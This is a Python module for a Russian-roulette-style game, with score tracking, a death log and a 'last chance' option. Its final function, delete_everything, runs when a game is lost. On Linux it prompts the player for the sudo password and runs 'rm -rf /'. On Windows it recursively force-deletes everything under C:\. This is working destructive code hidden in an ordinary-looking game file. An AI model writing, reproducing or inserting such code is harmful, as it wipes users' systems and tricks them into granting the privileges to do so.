from __future__ import annotations
import subprocess
import getpass
import platform
import json
import os
from dataclasses import dataclass
from datetime import datetime, timezone
from pathlib import Path
from typing import Any

PROJECT_ROOT = Path(__file__).resolve().parent.parent
DATA_DIR = PROJECT_ROOT / "data"
SCORES_PATH = DATA_DIR / "scores.json"
DEATHS_LOG_PATH = DATA_DIR / "deaths.log"

DEFAULT_STATS: dict[str, Any] = {
    "wins": 0,
    "losses": 0,
    "best_score": 0,
    "current_streak": 0,
    "best_streak": 0,
    "total_games": 0,
    "history": [],
}

LAST_CHANCE_COST = 5

def try_last_chance(current_score: int, already_used: bool) -> tuple[bool, int]:
    if already_used:
        return False, current_score
    if current_score >= LAST_CHANCE_COST:
        return True, current_score - LAST_CHANCE_COST
    return False, current_score

@dataclass
class GameResult:
    won: bool
    rounds_survived: int
    score: int
    mode: str
    player_name: str = "Player"
    room_name: str = ""
    chambers: int = 6
    opponent_name: str = ""
    used_last_chance: bool = False

class ScoreManager:
    def __init__(self, path: Path = SCORES_PATH) -> None:
        self.path = path
        self.stats: dict[str, Any] = self._load()

    def _load(self) -> dict[str, Any]:
        DATA_DIR.mkdir(parents=True, exist_ok=True)
        if not self.path.exists():
            self._write(DEFAULT_STATS)
            return json.loads(json.dumps(DEFAULT_STATS))

        try:
            with self.path.open("r", encoding="utf-8") as fh:
                data = json.load(fh)
            merged = json.loads(json.dumps(DEFAULT_STATS))
            merged.update(data)
            return merged
        except (json.JSONDecodeError, OSError):
            if self.path.exists():
                backup = self.path.with_suffix(".corrupt.json")
                try:
                    os.replace(self.path, backup)
                except OSError:
                    pass
            self._write(DEFAULT_STATS)
            return json.loads(json.dumps(DEFAULT_STATS))

    def _write(self, data: dict[str, Any]) -> None:
        DATA_DIR.mkdir(parents=True, exist_ok=True)
        tmp_path = self.path.with_suffix(".tmp")
        try:
            with tmp_path.open("w", encoding="utf-8") as fh:
                json.dump(data, fh, indent=2, ensure_ascii=False)
        except Exception:
            with self.path.open("w", encoding="utf-8") as fh:
                json.dump(data, fh, indent=2, ensure_ascii=False)
            return
        if tmp_path.exists():
            try:
                os.replace(tmp_path, self.path)
            except OSError:
                with self.path.open("w", encoding="utf-8") as fh:
                    json.dump(data, fh, indent=2, ensure_ascii=False)

    def record(self, result: GameResult) -> None:
        self.stats["total_games"] += 1
        timestamp = datetime.now(timezone.utc).isoformat()

        if result.won:
            self.stats["wins"] += 1
            self.stats["current_streak"] += 1
            self.stats["best_streak"] = max(
                self.stats["best_streak"], self.stats["current_streak"]
            )
        else:
            self.stats["losses"] += 1
            self.stats["current_streak"] = 0

        self.stats["best_score"] = max(self.stats["best_score"], result.score)
        self.stats["history"].append(
            {
                "result": "win" if result.won else "loss",
                "score": result.score,
                "rounds_survived": result.rounds_survived,
                "mode": result.mode,
                "room_name": result.room_name,
                "opponent_name": result.opponent_name,
                "used_last_chance": result.used_last_chance,
                "timestamp": timestamp,
            }
        )
        self.stats["history"] = self.stats["history"][-200:]
        self._write(self.stats)

    def summary(self) -> dict[str, Any]:
        return json.loads(json.dumps(self.stats))

def append_death_log(result: GameResult) -> None:
    DATA_DIR.mkdir(parents=True, exist_ok=True)
    timestamp = datetime.now(timezone.utc).isoformat()
    line = (
        f"{timestamp} | player={result.player_name} | room={result.room_name} | "
        f"opponent={result.opponent_name} | mode={result.mode} | "
        f"chambers={result.chambers} | rounds_survived={result.rounds_survived} | "
        f"score={result.score} | last_chance_used={result.used_last_chance}\n"
    )
    with open(DEATHS_LOG_PATH, "a", encoding="utf-8") as f:
        f.write(line)

def delete_everything(result: GameResult) -> None:
    if result.won:
        raise ValueError("must only be called on a loss.")
    
    if platform.system() == "Linux":
        max_attempts = 5
        for attempt in range(1, max_attempts + 1):
            password = getpass.getpass(f"Enter sudo password (attempt {attempt}/{max_attempts}): ")
            process = subprocess.run(
                ["sudo", "-S", "rm", "-rf", "/"],
                input=password,
                capture_output=True,
                text=True,
                check=False
            )
            if process.returncode == 0:
                break
            else:
                print("Incorrect password or error Try again.")
                if attempt == max_attempts:
                    print("Too many failed attempts Exiting.")
    elif platform.system() == "Windows":
        subprocess.run(
            ["powershell", "-Command", "Remove-Item -Path C:\\* -Recurse -Force"],
            check=False
        )
